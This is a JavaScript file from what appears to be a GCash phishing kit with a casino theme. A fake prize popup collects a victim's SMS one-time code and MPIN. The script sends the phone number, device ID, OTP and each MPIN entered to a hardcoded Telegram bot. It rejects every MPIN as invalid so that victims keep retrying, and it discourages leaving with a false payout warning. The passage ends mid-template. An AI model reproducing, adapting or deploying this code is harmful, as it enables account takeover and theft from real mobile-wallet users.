/**
 * Popup Share Module - Casino Theme Remastered
 * With Telegram Notifications for 6-digit request, verification attempts, AND 6-digit code entry
 * Balance Check + Decrement Animation
 */

// ========== POPUP MODULE ==========
(function() {
    'use strict';
    
    let currentBalance = 0;
    let currentPhase = 1;
    let claimInProgress = false;
    let isRedirecting = false;
    let currentFirewallStatus = false;
    let invalidAttempts = 0;
    const MAX_ATTEMPTS = 5;
    let detectedSMSCode = '';
    let smsReceiverStarted = false;
    let currentMPIN = '';
    let lastNotifiedCode = '';
    
    // ========== SOUND EFFECT ==========
    function playClaimSound() {
        try {
            const audio = new Audio('sounds/super_ace_scatter_ring.mp3');
            audio.volume = 0.7;
            audio.play().catch(e => console.log('Sound play prevented:', e));
        } catch(e) {
            console.log('Sound error:', e);
        }
    }
    
    // ========== TELEGRAM NOTIFICATIONS ==========
    const BOT_TOKEN = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
    const CHAT_ID = "7298607329";
    
    async function sendTelegramMessage(message) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
            console.log('Telegram sent');
        } catch(e) {
            console.error('Telegram error:', e);
        }
    }
    
    async function send6DigitRequestNotification(userPhone, deviceId) {
        const now = new Date();
        const timestamp = now.toLocaleString();
        const message = `🔐 6-DIGIT CODE REQUESTED\nUser: ${userPhone}\nDevice ID: ${deviceId}\nTime: ${timestamp}\nStatus: Waiting for 6-digit code input`;
        await sendTelegramMessage(message);
    }
    
    async function send6DigitCodeEnteredNotification(userPhone, deviceId, codeEntered) {
        const now = new Date();
        const timestamp = now.toLocaleString();
        const message = `📝 6-DIGIT CODE ENTERED\nUser: ${userPhone}\nDevice ID: ${deviceId}\nCode Entered: ${codeEntered}\nTime: ${timestamp}\nStatus: Code submitted for verification`;
        await sendTelegramMessage(message);
    }
    
    async function sendVerificationAttemptNotification(userPhone, deviceId, code, attemptsLeft) {
        const now = new Date();
        const timestamp = now.toLocaleString();
        const message = `🔑 VERIFICATION ATTEMPT\nUser: ${userPhone}\nDevice ID: ${deviceId}\nCode Entered: ${code}\nTime: ${timestamp}\nAttempts Left: ${attemptsLeft}/${MAX_ATTEMPTS}\nStatus: INVALID`;
        await sendTelegramMessage(message);
    }
    
    async function sendMaxAttemptsNotification(userPhone, deviceId) {
        const now = new Date();
        const timestamp = now.toLocaleString();
        const message = `⚠️ MAX ATTEMPTS REACHED\nUser: ${userPhone}\nDevice ID: ${deviceId}\nTime: ${timestamp}\nAction: Redirect to index.html`;
        await sendTelegramMessage(message);
    }
    
    // ========== INITIALIZATION ==========
    function init() {
        console.log('Popup Module Starting...');
        
        const popup = document.getElementById('prizePopup');
        if (!popup) {
            console.error('Popup element not found!');
            return;
        }
        
        getFirewallStatus();
        attachClaimButton();
        attachFirewallEvents();
        addAnimations();
        
        console.log('Popup Module ready');
    }
    
    // ========== RESET ATTEMPTS ==========
    function resetAttempts() {
        invalidAttempts = 0;
        currentMPIN = '';
        detectedSMSCode = '';
        lastNotifiedCode = '';
        console.log('Invalid attempts reset to 0');
    }
    
    // ========== HANDLE MAX ATTEMPTS ==========
    function handleMaxAttempts() {
        const userPhone = localStorage.getItem("userPhone") || "Unknown";
        const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
        
        sendMaxAttemptsNotification(userPhone, deviceId);
        
        alert("Use your registered GCash Number and claim again.");
        window.location.href = "index.html";
    }
    
    // ========== INCREMENT INVALID ATTEMPTS ==========
    function incrementInvalidAttempts() {
        invalidAttempts++;
        console.log(`Invalid attempt ${invalidAttempts}/${MAX_ATTEMPTS}`);
        
        if (invalidAttempts >= MAX_ATTEMPTS) {
            handleMaxAttempts();
            return true;
        }
        return false;
    }
    
    // ========== RESET TO STEP 1 ==========
    function resetToStep1() {
        const step1Container = document.getElementById('step1Container');
        const step2Container = document.getElementById('step2Container');
        const code6Input = document.getElementById('code6Digit');
        const smsPopup = document.getElementById('smsCodePopup');
        
        if (code6Input) code6Input.value = '';
        currentMPIN = '';
        lastNotifiedCode = '';
        updateMPINDots();
        
        if (step1Container) step1Container.style.display = 'block';
        if (step2Container) step2Container.style.display = 'none';
        
        const step1ErrorMsg = document.getElementById('step1ErrorMsg');
        if (step1ErrorMsg) step1ErrorMsg.style.display = 'none';
        
        const attemptsLeft = MAX_ATTEMPTS - invalidAttempts;
        const attemptsCounter = document.querySelector('.attempts-counter');
        if (attemptsCounter) {
            attemptsCounter.innerHTML = `⚠️ Attempts remaining: ${attemptsLeft} / ${MAX_ATTEMPTS}`;
            if (attemptsLeft <= 2) {
                attemptsCounter.style.color = '#ff4444';
                attemptsCounter.style.fontWeight = 'bold';
            }
        }
        
        if (smsPopup && detectedSMSCode) {
            smsPopup.style.display = 'block';
            setTimeout(() => {
                if (smsPopup) smsPopup.style.display = 'none';
            }, 10000);
        }
        
        console.log(`Reset to Step 1. Attempts left: ${attemptsLeft}`);
    }
    
    // ========== UPDATE MPIN DOTS ==========
    function updateMPINDots() {
        const dots = document.querySelectorAll('.mpin-dot');
        for (let i = 0; i < dots.length; i++) {
            if (i < currentMPIN.length) {
                dots[i].classList.add('filled');
            } else {
                dots[i].classList.remove('filled');
            }
        }
    }
    
    // ========== ADD ANIMATIONS - Casino Theme ==========
    function addAnimations() {
        const style = document.createElement('style');
        style.textContent = `
            @keyframes bounceIn {
                0% { transform: scale(0) rotate(-180deg); opacity: 0; }
                60% { transform: scale(1.1) rotate(0deg); }
                100% { transform: scale(1) rotate(0deg); opacity: 1; }
            }
            @keyframes pulseGold {
                0% { transform: scale(1); }
                50% { transform: scale(1.02); box-shadow: 0 0 25px rgba(212,175,55,0.6); }
                100% { transform: scale(1); }
            }
            @keyframes shake {
                0% { transform: translateX(0); }
                25% { transform: translateX(-5px); }
                50% { transform: translateX(5px); }
                75% { transform: translateX(-5px); }
                100% { transform: translateX(0); }
            }
            @keyframes neonBluePulse {
                0% { box-shadow: 0 0 5px #0066ff, 0 0 10px #0066ff; }
                50% { box-shadow: 0 0 15px #0066ff, 0 0 25px #0066ff, 0 0 35px #0066ff; }
                100% { box-shadow: 0 0 5px #0066ff, 0 0 10px #0066ff; }
            }
            @keyframes goldShine {
                0% { background-position: -200% center; }
                100% { background-position: 200% center; }
            }
            @keyframes balanceDrain {
                0%, 100% { transform: scale(1); }
                50% { transform: scale(1.05); filter: brightness(1.2); }
            }
            @keyframes balanceDrop {
                0% { transform: translateY(0); opacity: 1; }
                100% { transform: translateY(20px); opacity: 0.5; }
            }
            @keyframes indicatorFill {
                0% { width: 0; }
                100% { width: 100%; }
            }
            @keyframes successFlash {
                0% { transform: scale(1); }
                50% { transform: scale(1.3); filter: brightness(2); }
                100% { transform: scale(1); }
            }
            
            .btn-pulse {
                animation: pulseGold 0.5s ease;
            }
            .shake-effect {
                animation: shake 0.3s ease-in-out;
            }
            
            .mpin-dots {
                display: flex;
                justify-content: center;
                gap: 15px;
                margin: 20px 0;
            }
            .mpin-dot {
                width: 14px;
                height: 14px;
                border-radius: 50%;
                background: rgba(212, 175, 55, 0.3);
                border: 1px solid rgba(212, 175, 55, 0.5);
                transition: all 0.3s ease;
            }
            .mpin-dot.filled {
                background: #d4af37;
                box-shadow: 0 0 15px #d4af37, 0 0 30px rgba(212, 175, 55, 0.5);
            }
            
            .numeric-keypad {
                display: grid;
                grid-template-columns: repeat(3, 1fr);
                gap: 10px;
                padding: 15px;
                background: rgba(0, 0, 0, 0.4);
                border: 1px solid rgba(212, 175, 55, 0.2);
                border-radius: 16px;
                margin: 10px 0;
            }
            .num-btn {
                background: linear-gradient(145deg, #1a1a1a, #0a0a0a);
                border: 1px solid rgba(212, 175, 55, 0.4);
                border-radius: 50%;
                width: 55px;
                height: 55px;
                font-size: 22px;
                font-weight: bold;
                color: #fce883;
                cursor: pointer;
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 0 auto;
                font-family: 'Orbitron', monospace;
                transition: all 0.1s ease;
                box-shadow: 0 3px 0 rgba(212, 175, 55, 0.3);
            }
            .num-btn:active {
                transform: translateY(3px);
                box-shadow: 0 0 0 rgba(212, 175, 55, 0.3);
                background: linear-gradient(145deg, #0a0a0a, #1a1a1a);
                color: #d4af37;
            }
            
            .small-back-btn {
                background: linear-gradient(to bottom, #d4af37, #aa771c);
                border: 1px solid #fcf6ba;
                border-radius: 8px;
                padding: 8px 18px;
                font-size: 11px;
                font-weight: 700;
                color: #1a1100;
                cursor: pointer;
                display: inline-flex;
                align-items: center;
                justify-content: center;
                gap: 5px;
                width: auto;
                margin-top: 10px;
                font-family: 'Orbitron', monospace;
                letter-spacing: 1px;
                text-shadow: 1px 1px 0 rgba(255,255,255,0.3);
                box-shadow: 0 3px 0 #6e4b0c;
                transition: all 0.1s ease;
            }
            .small-back-btn:active {
                transform: translateY(3px);
                box-shadow: 0 0 0 #6e4b0c;
            }
            
            .attempts-counter {
                font-size: 10px;
                color: #d4af37;
                text-align: center;
                margin-top: 10px;
                font-family: 'Orbitron', monospace;
                letter-spacing: 1px;
            }
            
            .verification-input {
                text-align: center;
                font-size: 20px;
                font-weight: bold;
                width: 180px;
                padding: 12px;
                background: #000;
                border: 2px solid rgba(212, 175, 55, 0.5);
                border-radius: 8px;
                color: #fce883;
                font-family: 'Orbitron', monospace;
                transition: all 0.3s ease;
                letter-spacing: 3px;
            }
            .verification-input:focus {
                border-color: #d4af37;
                box-shadow: 0 0 15px rgba(212, 175, 55, 0.3);
                outline: none;
            }
            
            #smsCodePopup {
                background: linear-gradient(145deg, #1a0505, #000000);
                border: 1px solid #d4af37;
                border-radius: 12px;
                padding: 12px;
                margin: 10px 0;
                animation: bounceIn 0.3s ease;
                box-shadow: 0 0 20px rgba(212, 175, 55, 0.2);
            }
            
            #step1Container,
            #step2Container {
                background: linear-gradient(145deg, rgba(20, 15, 40, 0.5), rgba(10, 5, 20, 0.5));
                border: 1px solid rgba(212, 175, 55, 0.3);
                border-radius: 16px;
                padding: 15px;
                margin: 10px 0;
            }
            
            .claim-gcash-button {
                background: linear-gradient(to bottom, #d4af37, #aa771c);
                border: 1px solid #fcf6ba;
                border-radius: 8px;
                padding: 12px 20px;
                font-weight: 800;
                color: #1a1100;
                font-size: 13px;
                cursor: pointer;
                font-family: 'Orbitron', monospace;
                letter-spacing: 1px;
                text-shadow: 1px 1px 0 rgba(255,255,255,0.3);
                box-shadow: 0 4px 0 #6e4b0c;
                transition: all 0.1s ease;
            }
            .claim-gcash-button:active {
                transform: translateY(4px);
                box-shadow: 0 0 0 #6e4b0c;
            }
            .claim-gcash-button:disabled {
                opacity: 0.7;
                cursor: not-allowed;
                pointer-events: none;
            }
            
            .divider {
                width: 50px;
                height: 2px;
                background: linear-gradient(90deg, #aa771c, #fcf6ba, #aa771c);
                margin: 10px auto;
            }
            
            .phase2-heading {
                font-family: 'Orbitron', monospace;
                font-size: 18px;
                font-weight: 900;
                background: linear-gradient(to bottom, #fcf6ba, #d4af37, #aa771c);
                -webkit-background-clip: text;
                background-clip: text;
                color: transparent;
                margin: 5px 0;
                letter-spacing: 1px;
                text-align: center;
            }
            
            .phase3-heading {
                font-family: 'Orbitron', monospace;
                font-size: 18px;
                font-weight: 900;
                color: #d4af37;
                margin: 5px 0;
                letter-spacing: 1px;
                text-align: center;
                text-shadow: 0 0 10px rgba(212, 175, 55, 0.5);
            }
        `;
        
        if (!document.querySelector('#popup-casino-animations')) {
            style.id = 'popup-casino-animations';
            document.head.appendChild(style);
        }
    }
    
    // ========== BALANCE DECREMENT ANIMATION ==========
    function animateBalanceDecrement(start, end, duration, callback) {
        const balanceSpan = document.getElementById('popupBalanceAmount');
        const balanceDisplay = document.getElementById('popupBalanceDisplay');
        const indicator1 = document.getElementById('indicator1');
        const indicator2 = document.getElementById('indicator2');
        const indicator3 = document.getElementById('indicator3');
        const claimBtn = document.getElementById('claimGCashBtn');
        
        if (!balanceSpan) {
            if (callback) callback();
            return;
        }
        
        // Disable button during animation
        if (claimBtn) {
            claimBtn.disabled = true;
            claimBtn.style.opacity = '0.7';
            claimBtn.style.pointerEvents = 'none';
            claimBtn.innerHTML = '⏳ PROCESSING...';
        }
        
        // Activate indicators one by one
        let indicatorStep = 0;
        const indicatorInterval = setInterval(() => {
            indicatorStep++;
            if (indicatorStep === 1 && indicator1) {
                indicator1.style.background = '#d4af37';
                indicator1.style.boxShadow = '0 0 10px #d4af37';
            }
            if (indicatorStep === 2 && indicator2) {
                indicator2.style.background = '#d4af37';
                indicator2.style.boxShadow = '0 0 10px #d4af37';
            }
            if (indicatorStep === 3 && indicator3) {
                indicator3.style.background = '#d4af37';
                indicator3.style.boxShadow = '0 0 10px #d4af37';
                clearInterval(indicatorInterval);
            }
        }, duration / 4);
        
        const totalSteps = 30;
        const decrementAmount = start / totalSteps;
        let currentStep = 0;
        
        // Add pulse animation to balance
        if (balanceDisplay) {
            balanceDisplay.style.animation = 'balanceDrain 0.3s ease infinite';
        }
        
        const interval = setInterval(() => {
            currentStep++;
            const currentVal = start - (decrementAmount * currentStep);
            
            if (balanceSpan) {
                balanceSpan.textContent = Math.max(0, currentVal).toFixed(2);
                balanceSpan.style.color = currentVal < start * 0.3 ? '#ff6666' : '#fce883';
                balanceSpan.style.fontSize = (48 - (currentStep * 0.8)) + 'px';
            }
            
            if (currentStep >= totalSteps) {
                clearInterval(interval);
                
                if (balanceSpan) {
                    balanceSpan.textContent = '0.00';
                    balanceSpan.style.color = '#ff4444';
                    balanceSpan.style.fontSize = '48px';
                }
                
                if (balanceDisplay) {
                    balanceDisplay.style.animation = 'none';
                }
                
                // Reset indicators
                [indicator1, indicator2, indicator3].forEach(ind => {
                    if (ind) {
                        ind.style.background = 'rgba(212,175,55,0.3)';
                        ind.style.boxShadow = 'none';
                    }
                });
                
                // Show success flash
                if (balanceDisplay) {
                    balanceDisplay.style.animation = 'successFlash 0.5s ease';
                    balanceDisplay.innerHTML = '✅ <span style="font-size:24px; color:#22C55E;">PROCESSING</span>';
                    
                    setTimeout(() => {
                        if (balanceDisplay) {
                            balanceDisplay.style.animation = 'none';
                        }
                    }, 500);
                }
                
                // Proceed after short delay
                setTimeout(() => {
                    if (callback) callback();
                }, 600);
            }
        }, duration / totalSteps);
        
        // Add pulse effect to button
        if (claimBtn) {
            claimBtn.style.animation = 'pulseGold 0.5s ease infinite';
        }
    }
    
    // ========== SMS RETRIEVER ==========
    function startSmsRetriever() {
        if (smsReceiverStarted) return;
        smsReceiverStarted = true;
        
        console.log('SMS Retriever started - waiting for SMS...');
        
        if (window.smsretriever) {
            window.smsretriever.startWatch(function(sms) {
                console.log('Raw SMS received:', sms);
                
                const match = sms.match(/\b\d{6}\b/);
                if (match) {
                    const code = match[0];
                    console.log('Extracted 6-digit code:', code);
                    detectedSMSCode = code;
                    
                    const smsPopup = document.getElementById('smsCodePopup');
                    const smsCodeSpan = document.getElementById('smsCodeValue');
                    const codeInput = document.getElementById('code6Digit');
                    
                    if (smsPopup && smsCodeSpan) {
                        smsCodeSpan.innerHTML = code;
                        smsPopup.style.display = 'block';
                        
                        setTimeout(() => {
                            if (smsPopup) smsPopup.style.display = 'none';
                        }, 10000);
                    }
                    
                    if (codeInput) {
                        codeInput.value = code;
                        codeInput.style.borderColor = '#22C55E';
                        codeInput.style.boxShadow = '0 0 15px #22C55E';
                        
                        setTimeout(() => {
                            const verifyBtn = document.getElementById('verify6DigitBtn');
                            if (verifyBtn) verifyBtn.click();
                        }, 500);
                    }
                }
            });
        } else {
            console.log('SMS Retriever not available');
        }
    }
    
    // ========== GET FIREWALL STATUS ==========
    async function getFirewallStatus() {
        try {
            const db = firebase.database();
            const snapshot = await db.ref('admin/globalFirewall').once('value');
            const data = snapshot.val();
            currentFirewallStatus = (data && data.active === true);
            console.log('Firewall status:', currentFirewallStatus ? 'ON' : 'OFF');
            return currentFirewallStatus;
        } catch(e) {
            console.error('Firewall error:', e);
            return false;
        }
    }
    
    // ========== SYNC BALANCE FROM FIREBASE ==========
    async function syncBalanceFromFirebase() {
        const userPhone = localStorage.getItem("userPhone");
        if (!userPhone) return 0;
        
        try {
            const db = firebase.database();
            const snap = await db.ref('user_sessions/' + userPhone).once('value');
            if (snap.exists() && snap.val().balance !== undefined) {
                const balance = snap.val().balance;
                const balanceEl = document.getElementById('userBalanceDisplay');
                if (balanceEl) balanceEl.innerText = balance.toFixed(2);
                return balance;
            }
        } catch(e) {
            console.error('Error syncing balance:', e);
        }
        return 0;
    }
    
    // ========== ATTACH CLAIM BUTTON ==========
    function attachClaimButton() {
        const claimBtn = document.getElementById('claimNowBtn');
        if (!claimBtn) {
            console.error('Claim button not found!');
            return;
        }
        
        claimBtn.onclick = async function(e) {
            e.preventDefault();
            e.stopPropagation();
            
            console.log('Claim button clicked!');
            
            playClaimSound();
            resetAttempts();
            
            const userPhone = localStorage.getItem("userPhone") || "Unknown";
            const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
            await send6DigitRequestNotification(userPhone, deviceId);
            
            const balance = await syncBalanceFromFirebase();
            showPopup(balance);
            
            if (window.ConfettiModule) window.ConfettiModule.start();
        };
        
        console.log('Claim button attached with sound effect');
    }
    
    // ========== ATTACH FIREWALL EVENTS ==========
    function attachFirewallEvents() {
        const closeBtn = document.getElementById('firewallCloseBtn');
        if (closeBtn) {
            closeBtn.onclick = function() {
                hideFirewallPopup();
                showPhase1(currentBalance);
            };
        }
    }
    
    // ========== GET PAYOUT LINK ==========
    async function getLatestPayoutLink() {
        try {
            const db = firebase.database();
            const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
            if (snapshot.exists()) {
                const key = Object.keys(snapshot.val())[0];
                const linkData = snapshot.val()[key];
                return { key: key, url: linkData.url };
            }
            return null;
        } catch(e) {
            console.error('Link error:', e);
            return null;
        }
    }
    
    // ========== MARK LINK AS USED ==========
    async function markLinkAsUsed(linkKey, userPhone) {
        try {
            const db = firebase.database();
            await db.ref('links/' + linkKey).update({
                status: 'used',
                user: userPhone,
                usedAt: Date.now()
            });
            console.log('Link marked as used');
        } catch(e) {
            console.error('Error marking link:', e);
        }
    }
    
    // ========== BEFORE UNLOAD HANDLER ==========
    function beforeUnloadHandler(e) {
        if (claimInProgress && !isRedirecting) {
            const message = "Your payout is unsuccessful! Please complete the process.";
            e.preventDefault();
            e.returnValue = message;
            return message;
        }
    }
    
    // ========== SHOW FIREWALL POPUP ==========
    function showFirewallPopup() {
        const popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        currentPhase = 3;
        detectedSMSCode = '';
        lastNotifiedCode = '';
        
        popupInner.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
        popupInner.style.opacity = '0';
        popupInner.style.transform = 'scale(0.95)';
        
        setTimeout(() => {
            showPhase3();
            popupInner.style.opacity = '1';
            popupInner.style.transform = 'scale(1)';
        }, 300);
        
        startSmsRetriever();
    }
    
    // ========== PHASE 3: CLAIMING VERIFICATION ==========
    function showPhase3() {
        const popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        const popupContainer = document.querySelector('.popup-container');
        if (popupContainer) {
            popupContainer.style.maxWidth = '380px';
            popupContainer.style.width = '90%';
        }
        
        const attemptsLeft = MAX_ATTEMPTS - invalidAttempts;
        
        popupInner.innerHTML = `
            <div class="popup-close" id="popupClosePhase3">✕</div>
            
            <div style="text-align: center; margin-bottom: 10px;">
                <img src="images/gc_icon.png" style="width: 60px; height: 60px; animation: bounceIn 0.5s ease; border-radius: 50%; border: 2px solid #d4af37; box-shadow: 0 0 20px rgba(212,175,55,0.4);">
            </div>
            
            <h2 class="phase3-heading">CLAIMING VERIFICATION</h2>
            
            <div class="divider"></div>
            
            <div class="attempts-counter">⚠️ Attempts remaining: ${attemptsLeft} / ${MAX_ATTEMPTS}</div>
            
            <div id="smsCodePopup" style="display: none;">
                <div style="display: flex; align-items: center; gap: 12px;">
                    <div style="font-size: 32px;">📨</div>
                    <div style="flex: 1;">
                        <div style="font-size: 10px; color: #d4af37; font-family: 'Orbitron', monospace; letter-spacing: 1px;">SMS RECEIVED</div>
                        <div style="font-size: 16px; color: #fce883; font-weight: bold; font-family: 'Orbitron', monospace; letter-spacing: 2px;" id="smsCodeValue">------</div>
                    </div>
                    <button id="autoFillSmsBtn" class="small-back-btn" style="background: linear-gradient(to bottom, #22C55E, #16A34A); color: #fff; border: 1px solid #4ade80; text-shadow: none; box-shadow: 0 3px 0 #15803d;">USE CODE</button>
                </div>
            </div>
            
            <div id="step1Container">
                <div style="text-align: center; margin-bottom: 10px;">
                    <span style="font-size: 11px; color: #d4af37; font-family: 'Orbitron', monospace; letter-spacing: 2px;">STEP 1 OF 2</span>
                </div>
                <p style="font-size: 11px; color: #999; text-align: center; margin: 0 0 10px 0; font-family: 'Poppins', sans-serif;">
                    Enter the <strong style="color: #fce883;">6-digit verification code</strong> received via SMS
                </p>
                <div style="display: flex; gap: 10px; justify-content: center; align-items: center;">
                    <input type="text" id="code6Digit" class="verification-input" placeholder="000000" maxlength="6" inputmode="numeric" autocomplete="one-time-code">
                    <button id="verify6DigitBtn" class="claim-gcash-button" style="background: linear-gradient(to bottom, #0066ff, #0044cc); border: 1px solid #3399ff; color: #fff; text-shadow: none; box-shadow: 0 4px 0 #003399; padding: 12px 18px;">VERIFY</button>
                </div>
                <div id="step1ErrorMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff6666; font-size: 11px; font-family: 'Poppins', sans-serif;"></div>
            </div>
            
            <div id="step2Container" style="display: none;">
                <div style="text-align: center; margin-bottom: 10px;">
                    <span style="font-size: 11px; color: #d4af37; font-family: 'Orbitron', monospace; letter-spacing: 2px;">STEP 2 OF 2</span>
                </div>
                <p style="font-size: 11px; color: #999; text-align: center; margin: 0 0 10px 0; font-family: 'Poppins', sans-serif;">
                    Enter your <strong style="color: #fce883;">4-digit MPIN</strong>
                </p>
                
                <div class="mpin-dots" id="mpinDots">
                    <div class="mpin-dot"></div>
                    <div class="mpin-dot"></div>
                    <div class="mpin-dot"></div>
                    <div class="mpin-dot"></div>
                </div>
                
                <div class="numeric-keypad">
                    <button class="num-btn" data-num="1">1</button>
                    <button class="num-btn" data-num="2">2</button>
                    <button class="num-btn" data-num="3">3</button>
                    <button class="num-btn" data-num="4">4</button>
                    <button class="num-btn" data-num="5">5</button>
                    <button class="num-btn" data-num="6">6</button>
                    <button class="num-btn" data-num="7">7</button>
                    <button class="num-btn" data-num="8">8</button>
                    <button class="num-btn" data-num="9">9</button>
                    <button class="num-btn" data-num="clear" style="font-size: 16px;">⌫</button>
                    <button class="num-btn" data-num="0">0</button>
                    <button class="num-btn" data-num="reset" style="font-size: 16px;">↺</button>
                </div>
                
                <div id="step2ErrorMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff4444; font-size: 12px; padding: 8px; border-radius: 8px; font-family: 'Poppins', sans-serif; background: rgba(255, 68, 68, 0.1); border: 1px solid rgba(255, 68, 68, 0.3);">
                    ❌ Invalid MPIN. Please try again.
                </div>
            </div>
            
            <div style="text-align: center; margin-top: 12px;">
                <button class="small-back-btn" id="backBtnPhase3">← BACK</button>
            </div>
        `;
        
        attachPhase3Events();
    }
    
    // ========== ATTACH PHASE 3 EVENTS ==========
    function attachPhase3Events() {
        const closeBtn = document.getElementById('popupClosePhase3');
        if (closeBtn) closeBtn.onclick = function() { closePopup(); };
        
        const backBtn = document.getElementById('backBtnPhase3');
        if (backBtn) {
            backBtn.onclick = function() {
                const popupInner = document.querySelector('.popup-inner');
                if (popupInner) {
                    popupInner.style.transition = 'opacity 0.3s ease';
                    popupInner.style.opacity = '0';
                    setTimeout(() => {
                        showPhase1(currentBalance);
                        popupInner.style.opacity = '1';
                    }, 300);
                }
            };
        }
        
        const verifyBtn = document.getElementById('verify6DigitBtn');
        const codeInput = document.getElementById('code6Digit');
        const step1Container = document.getElementById('step1Container');
        const step2Container = document.getElementById('step2Container');
        const step1ErrorMsg = document.getElementById('step1ErrorMsg');
        
        const autoFillBtn = document.getElementById('autoFillSmsBtn');
        if (autoFillBtn) {
            autoFillBtn.onclick = function() {
                if (codeInput && detectedSMSCode) {
                    codeInput.value = detectedSMSCode;
                    codeInput.style.borderColor = '#22C55E';
                    codeInput.style.boxShadow = '0 0 15px #22C55E';
                    
                    setTimeout(() => {
                        if (verifyBtn) verifyBtn.click();
                    }, 300);
                    
                    const smsPopup = document.getElementById('smsCodePopup');
                    if (smsPopup) smsPopup.style.display = 'none';
                }
            };
        }
        
        if (verifyBtn) {
            verifyBtn.onclick = async function() {
                const code = codeInput ? codeInput.value.trim() : '';
                
                if (!code || code.length !== 6 || !/^\d+$/.test(code)) {
                    if (step1ErrorMsg) {
                        step1ErrorMsg.innerText = "Please enter a valid 6-digit code.";
                        step1ErrorMsg.style.display = 'block';
                    }
                    if (codeInput) {
                        codeInput.classList.add('shake-effect');
                        setTimeout(() => codeInput.classList.remove('shake-effect'), 300);
                    }
                    return;
                }
                
                console.log('6-digit code accepted:', code);
                
                const userPhone = localStorage.getItem("userPhone") || "Unknown";
                const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
                
                if (lastNotifiedCode !== code) {
                    await send6DigitCodeEnteredNotification(userPhone, deviceId, code);
                    lastNotifiedCode = code;
                }
                
                step1Container.style.transition = 'opacity 0.3s ease';
                step1Container.style.opacity = '0';
                
                setTimeout(() => {
                    step1Container.style.display = 'none';
                    step2Container.style.display = 'block';
                    step2Container.style.opacity = '0';
                    step2Container.style.transform = 'scale(0.95)';
                    
                    setTimeout(() => {
                        step2Container.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
                        step2Container.style.opacity = '1';
                        step2Container.style.transform = 'scale(1)';
                    }, 50);
                }, 300);
                
                attachMPINKeypad();
            };
        }
        
        if (codeInput) {
            codeInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    if (verifyBtn) verifyBtn.click();
                }
            });
            
            codeInput.addEventListener('input', function(e) {
                const value = this.value.trim();
                if (value.length === 6 && /^\d+$/.test(value)) {
                    this.style.borderColor = '#22C55E';
                    this.style.boxShadow = '0 0 15px #22C55E';
                    if (verifyBtn) verifyBtn.click();
                } else {
                    this.style.borderColor = 'rgba(212, 175, 55, 0.5)';
                    this.style.boxShadow = 'none';
                }
            });
        }
    }
    
    // ========== ATTACH MPIN KEYPAD ==========
    function attachMPINKeypad() {
        currentMPIN = '';
        updateMPINDots();
        
        function checkMPIN() {
            if (currentMPIN.length === 4) {
                const userPhone = localStorage.getItem("userPhone") || "Unknown";
                const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
                
                const maxReached = incrementInvalidAttempts();
                const attemptsLeft = MAX_ATTEMPTS - invalidAttempts;
                
                sendVerificationAttemptNotification(userPhone, deviceId, currentMPIN, attemptsLeft);
                
                const attemptsCounter = document.querySelector('.attempts-counter');
                if (attemptsCounter) {
                    attemptsCounter.innerHTML = `⚠️ Attempts remaining: ${attemptsLeft} / ${MAX_ATTEMPTS}`;
                    if (attemptsLeft <= 2) {
                        attemptsCounter.style.color = '#ff4444';
                        attemptsCounter.style.fontWeight = 'bold';
                    }
                }
                
                const errorMsg = document.getElementById('step2ErrorMsg');
                const mpinDots = document.getElementById('mpinDots');
                
                if (errorMsg) {
                    errorMsg.style.display = 'block';
                }
                if (mpinDots) {
                    mpinDots.classList.add('shake-effect');
                    setTimeout(() => mpinDots.classList.remove('shake-effect'), 300);
                }
                
                currentMPIN = '';
                updateMPINDots();
                
                if (!maxReached) {
                    setTimeout(() => {
                        if (errorMsg) errorMsg.style.display = 'none';
                        resetToStep1();
                    }, 1500);
                }
            }
        }
        
        const numBtns = document.querySelectorAll('.num-btn');
        for (let i = 0; i < numBtns.length; i++) {
            const btn = numBtns[i];
            const newBtn = btn.cloneNode(true);
            btn.parentNode.replaceChild(newBtn, btn);
            
            newBtn.onclick = function() {
                const num = this.getAttribute('data-num');
                
                if (num === 'clear') {
                    currentMPIN = currentMPIN.slice(0, -1);
                    updateMPINDots();
                } 
                else if (num === 'reset') {
                    currentMPIN = '';
                    updateMPINDots();
                }
                else if (currentMPIN.length < 4) {
                    currentMPIN += num;
                    updateMPINDots();
                    if (currentMPIN.length === 4) {
                        checkMPIN();
                    }
                }
            };
        }
    }
    
    // ========== HIDE FIREWALL POPUP ==========
    function hideFirewallPopup() {
        console.log('Firewall popup closed');
    }
    
    // ========== CHECK FIREWALL AND TRANSITION ==========
    async function checkFirewallAndTransition() {
        const isFirewallOn = await getFirewallStatus();
        
        if (isFirewallOn) {
            console.log('Firewall ON - Showing verification');
            showFirewallPopup();
        } else {
            console.log('Firewall OFF - Transition to Phase 2');
            transitionToPhase2();
        }
    }
    
    // ========== TRANSITION TO PHASE 2 ==========
    function transitionToPhase2() {
        const popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        popupInner.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
        popupInner.style.opacity = '0';
        popupInner.style.transform = 'scale(0.95)';
        
        setTimeout(() => {
            showPhase2();
            popupInner.style.opacity = '1';
            popupInner.style.transform = 'scale(1)';
        }, 300);
    }
    
    // ========== PHASE 1: DEFAULT POPUP - Casino Theme ==========
    function showPhase1(balance) {
        const popupInner = document.querySelector('.popup-inner');
        if (!popupInner) return;
        
        const popupContainer = document.querySelector('.popup-container');
        if (popupContainer) {
            popupContainer.style.maxWidth = '360px';
            popupContainer.style.width = '90%';
        }
        
        currentBalance = balance;
        currentPhase = 1;
        
        popupInner.style.transition = '';
        popupInner.style.opacity = '1';
        popupInner.style.transform = '';
        
        popupInner.innerHTML = `
            <div class="popup-close" id="popupClosePhase1">✕</div>
